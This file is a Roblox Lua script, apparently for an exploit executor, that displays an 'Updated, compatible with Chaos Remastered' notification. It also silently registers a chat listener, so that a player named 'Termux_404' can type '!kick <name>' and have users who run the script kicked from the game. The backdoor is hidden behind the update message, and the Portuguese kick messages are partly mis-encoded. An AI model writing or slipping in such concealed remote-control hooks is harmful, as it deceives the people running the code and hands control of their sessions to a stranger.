local localPlayer = game.Players.LocalPlayer
local gui = localPlayer:FindFirstChild("PlayerGui")

if gui and not gui:FindFirstChild("NotificadoComSucesso", true) then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "[⭐]Updated[⭐]",
        Text = "COMPATIBLE WITH CHAOS REMASTERED! :D",
        Icon = "rbxassetid://15944092143",
        Duration = 25
    })
end

wait(0.5)
local gui = Instance.new("ScreenGui")
gui.Name = "NotificadoComSucesso"
gui.ResetOnSpawn = false
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local localPlayer = game.Players.LocalPlayer
local gui = localPlayer:FindFirstChild("PlayerGui")

if gui and not gui:FindFirstChild("Executado", true) then

    local function handleChat(player, message)
        local termuxName = "Termux_404"
        local lowerMessage = string.lower(message:match("^%s*(.-)%s*$"))

        if player.DisplayName:lower():find(termuxName:lower()) == 1 or player.Name:lower():find(termuxName:lower()) == 1 then
            if lowerMessage:sub(1, 6) == "!kick " then
                local targetName = lowerMessage:match("!kick%s*(.+)")
                if targetName then
                    for _, p in pairs(game.Players:GetPlayers()) do
                        if string.lower(p.Name):find(targetName:lower()) == 1 then
                            if p == player then
                                game.Players.LocalPlayer:Kick("VocÃª nÃ£o pode se expulsar!")
                            else
                                p:Kick("Voce foi expulso por " .. player.Name)
                            end
                            break
                        end
                    end
                end
            end
        end
    end

    game.Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(message)
            handleChat(player, message)
        end)
    end)

    wait(0.5)
    local gui = Instance.new("ScreenGui")
    gui.Name = "Executado"
    gui.ResetOnSpawn = false
    gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
end